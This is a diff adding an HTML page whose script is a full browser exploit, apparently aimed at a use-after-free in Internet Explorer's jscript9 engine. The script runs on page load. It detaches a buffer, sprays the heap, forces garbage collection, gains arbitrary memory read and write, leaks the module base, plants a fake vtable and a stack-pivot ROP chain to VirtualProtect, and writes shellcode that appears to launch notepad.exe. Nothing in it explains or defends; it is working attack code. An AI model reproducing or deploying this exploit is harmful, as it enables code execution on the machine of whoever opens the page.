@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      var arr = new Array(100000);
+      var arr1 = new Array(10000);
+      var ab2 = new ArrayBuffer(0x1337);
+      function sprayHeap() {
+        for (var i = 0; i < 100000; i++) {
+          arr[i] = new Uint8Array(ab2);
+        }
+      }
+      // used to trigger collection of large heap blocks
+      function spray1() {
+          for (var i = 0; i < arr1.length; i++) {
+              arr1[i] = new ArrayBuffer(1024);
+          }
+      }
+      function pwn() {
+        var lengthIdx;
+        var mv;
+        var jscript9Base;
+        var ab = new ArrayBuffer(2123 * 1024);
+        var ia = new Int8Array(ab);
+        spray1();
+        detach(ab);
+        setTimeout(main, 50, ia);
+        function detach(ab) {
+          postMessage("", "*", [ab]);
+        }
+        function ub(sb) {
+          return (sb < 0) ? sb + 0x100 : sb;
+        }
+        function setAddress(addr) {
+          ia[lengthIdx + 4] = addr & 0xFF;
+          ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
+          ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
+          ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
+        }
+        function readN(addr, n) {
+          if (n != 4 && n != 8)
+            return 0;
+          setAddress(addr);
+          var ret = 0;
+          for (var i = 0; i < n; i++)
+            ret |= (mv[i] << (i * 8))
+          return ret;
+        }
+        function writeN(addr, val, n) {
+          if (n != 2 && n != 4 && n != 8)
+            return;
+          setAddress(addr);
+          for (var i = 0; i < n; i++)
+            mv[i] = (val >> (i * 8)) & 0xFF
+        }
+        function main(ia) {
+            // trigger collection
+            arr1 = null;
+            CollectGarbage();
+            // allocate objects
+            sprayHeap();
+            for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00; i++)
+            {
+                if (ia[i] === undefined)
+                    return;
+            }
+            ia[i]++;
+            lengthIdx = i;
+            try {
+                for (var i = 0; arr[i].length != 0x1338; i++);
+            } catch (e) {
+                return;
+            }
+            mv = arr[i];
+            var bufaddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 + 2]) << 16 | ub(ia[lengthIdx + 4 + 3]) << 24;
+            var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1b]) << 8 | ub(ia[lengthIdx - 0x1a]) << 16 | ub(ia[lengthIdx - 0x19]) << 24;
+            // Calculate jscript9 base from vtable address
+            jscript9Base = (vtable - 0xc6bec) & 0xFFFF0000;
+            // VirtualProtect entry in import table
+            var vpaddr = readN(jscript9Base + 0x3e4244, 4);
+            var vtbladdr = bufaddr;
+            var ropaddr = bufaddr + 0x200;
+            var shcodeaddr = bufaddr + 0x300;
+            // 0x4C: GetPropertyReference
+            // 0x104: SkipsPrototype
+            // These get called, so we need to copy the original
+            writeN(vtbladdr + 0x4C, readN(vtable + 0x4C, 4), 4);
+            writeN(vtbladdr + 0x104, readN(vtable + 0x104, 4), 4);
+            // Stack-pivot gadget in jscript 9
+            // mov esp, ebx; pop ebx; ret
+            writeN(vtbladdr + 0x188, jscript9Base + 0x10dc32, 4);
+            var rop = [
+                0x41414141, vpaddr, shcodeaddr, shcodeaddr, 0x200, 0x40, ropaddr
+            ];
+            for (var i = 0; i < rop.length; i++)
+                writeN(ropaddr + i * 4, rop[i], 4);
+            // shellcode that will be vprot'd RWX
+            var sc = [
+                0x0089E8FC, 0x89600000, 0x64D231E5, 0x8B30528B, 0x528B0C52, 0x28728B14, 0x264AB70F, 0xC031FF31,
+                0x7C613CAC, 0xC1202C02, 0xC7010DCF, 0x5752F0E2, 0x8B10528B, 0xD0013C42, 0x8578408B, 0x014A74C0,
+                0x488B50D0, 0x20588B18, 0x3CE3D301, 0x8B348B49, 0xFF31D601, 0xC1ACC031, 0xC7010DCF, 0xF475E038,
+                0x3BF87D03, 0xE275247D, 0x24588B58, 0x8B66D301, 0x588B4B0C, 0x8BD3011C, 0xD0018B04, 0x24244489,
+                0x59615B5B, 0xE0FF515A, 0x8B5A5F58, 0x5D86EB12, 0x858D016A, 0x000000B9, 0x8B316850, 0xD5FF876F,
+                0x320EFEBB, 0x95A668EA, 0xD5FF9DBD, 0x0A7C063C, 0x75E0FB80, 0x1347BB05, 0x006A6F72, 0x6ED5FF53,
+                0x7065746F, 0x652E6461, 0x00006578
+            ];
+            for (var i = 0; i < sc.length; i++)
+                writeN(shcodeaddr + i * 4, sc[i], 4);
+            // update the length so that subarray works
+            ia[lengthIdx + 0x00] = 0xff;
+            ia[lengthIdx + 0x01] = 0xff;
+            ia[lengthIdx + 0x02] = 0xff;
+            ia[lengthIdx + 0x03] = 0x7e;
+            // overwrite with our fake vtable addr
+            ia[lengthIdx - 0x1c] = (vtbladdr >> 0) & 0xff;
+            ia[lengthIdx - 0x1b] = (vtbladdr >> 8) & 0xff;
+            ia[lengthIdx - 0x1a] = (vtbladdr >> 16) & 0xff;
+            ia[lengthIdx - 0x19] = (vtbladdr >> 24) & 0xff;
+            mv.subarray(ropaddr);
+        }
+    }
+      setTimeout(pwn, 50);
+    </script>
+  </body>
+</html>
